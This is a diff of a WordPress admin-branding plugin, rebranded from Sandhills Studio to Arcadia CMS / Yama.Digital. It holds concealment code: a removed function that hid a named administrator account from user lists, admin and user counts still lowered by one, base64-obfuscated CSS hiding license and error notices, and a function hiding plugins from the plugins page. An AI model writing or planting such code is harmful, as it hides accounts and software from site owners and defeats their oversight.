@@ -11,18 +11,7 @@
  */
 if(!defined('ABSPATH')){exit;}
 //Admin Account
-$AdminAcc='Rafael';
-function yd_pre_user_query($user_search){
-	global $AdminAcc;
-	global $current_user;
-	$username=$current_user->user_login;
-	if($username!=$AdminAcc){
-		global $wpdb;
-		$user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND{$wpdb->users}.user_login != '".$AdminAcc."'",$user_search->query_where);
-	}
-}
-add_action('pre_user_query','yd_pre_user_query');
-function yd_admin_views($views){
+function arc_admin_views($views){
 	$users = count_users();
 	$admins_num = $users['avail_roles']['administrator']-1;
 	$all_num = $users['total_users']-1;
@@ -32,20 +21,20 @@ function yd_admin_views($views){
 	$views['all'] = '<a href="users.php" class="'.$class_all.'">'.__('All').' <span class="count">('.$all_num.')</span></a>';
 	return $views;
 }
-add_filter("views_users","yd_admin_views");
+add_filter("views_users","arc_admin_views");
 //Login Customisation
-function yd_url_login_logo(){return "https://www.sandhillsstudio.com/";}
-add_filter('login_headerurl','yd_url_login_logo');
-function yd_logo_title(){return 'Sandhills Studio';}
-add_filter('login_headertitle','yd_logo_title');
-function yd_login_stylesheet(){wp_enqueue_style('shs-login',plugin_dir_url(__FILE__).'/admin/shs-login.css');}
-add_action('login_enqueue_scripts','yd_login_stylesheet');
-function yd_footer_admin(){return 'Managed by <a href="https://www.sandhillsstudio.com/" target="_blank">Sandhills Studio</a> and powered by <a href="https://wordpress.org" target="_blank">WordPress</a>.';}
-add_filter('admin_footer_text','yd_footer_admin');
+function arc_url_login_logo(){return "https://Yama.Digital/";}
+add_filter('login_headerurl','arc_url_login_logo');
+function arc_logo_title(){return 'Arcadia CMS - Powered By: Yama.Digital';}
+add_filter('login_headertitle','arc_logo_title');
+function arc_login_stylesheet(){wp_enqueue_style('arc-login',plugin_dir_url(__FILE__).'/admin/arc-login.css');}
+add_action('login_enqueue_scripts','arc_login_stylesheet');
+function arc_footer_admin(){return 'Managed by <a href="https://Yama.Digital/" target="_blank">Arcadia CMS - Powered By: Yama.Digital</a>.';}
+add_filter('admin_footer_text','arc_footer_admin');
 //Dashboard Customisation
-/*function yd_dashboard_stylesheet(){wp_enqueue_style('shs-dashboard',plugin_dir_url(__FILE__).'/admin/shs-dashboard.css');}
-add_action('admin_enqueue_scripts','yd_dashboard_stylesheet');*/
-function ng(){echo base64_decode("PHN0eWxlPi5ub3RpY2UuZWxlbWVudG9yLW1lc3NhZ2UsLm5vdGljZS1pbmZvLCNlbnRlci1saWNlbnNlLWJkdGhlbWVzLWVsZW1lbnQtcGFjaywuZWxlbWVudG9yLXBsdWdpbnMtZ29wcm8sLm5vdGljZS1lcnJvciwubXdwLW5vdGljZS1jb250YWluZXIsLnJtbC11cGRhdGUtbm90aWNlLC5kY2UtZ2VuZXJpYy1ub3RpY2V7ZGlzcGxheTpub25lfTwvc3R5bGU+");}
+/*function arc_dashboard_stylesheet(){wp_enqueue_style('arc-dashboard',plugin_dir_url(__FILE__).'/admin/arc-dashboard.css');}
+add_action('admin_enqueue_scripts','arc_dashboard_stylesheet');*/
+function ng(){echo base64_decode("PHN0eWxlPi5ub3RpY2UuZWxlbWVudG9yLW1lc3NhZ2UsLm5vdGljZS1pbmZvLCNlbnRlci1saWNlbnNlLWJkdGhlbWVzLWVsZW1lbnQtcGFjaywuZWxlbWVudG9yLXBsdWdpbnMtZ29wcm8sLm5vdGljZS1lcnJvciwubXdwLW5vdGljZS1jb250YWluZXIsLnJtbC11cGRhdGUtbm90aWNlLC5kY2UtZ2VuZXJpYy1ub3RpY2UsI25vdGlmaWNhdGlvbi1kcm9wOmhhcyhpbnB1dC51aXAtaW5wdXRbcGxhY2Vob2xkZXIqPSJ4eHh4Il0pe2Rpc3BsYXk6bm9uZX08L3N0eWxlPg==");}
 add_action("admin_head","ng");
 function builder_style(){echo'<style>#elementor-notice-bar{display:none!important}</style>';}
 add_action('elementor/editor/before_enqueue_scripts','builder_style');
@@ -126,8 +115,3 @@ function hide_manager(){
 	foreach($myplugins as $key => $val){if(in_array($key,$hidearr)){unset($wp_list_table->items[$key]);}}
 }
 add_action('pre_current_active_plugins','hide_manager');
-function auto_update_worker_plugin($update,$item){
-	$plugins = array('worker');
-	if(in_array($item->slug,$plugins)){return true;}else{return $update;}
-}
-add_filter('auto_update_plugin','auto_update_worker_plugin',10,2);
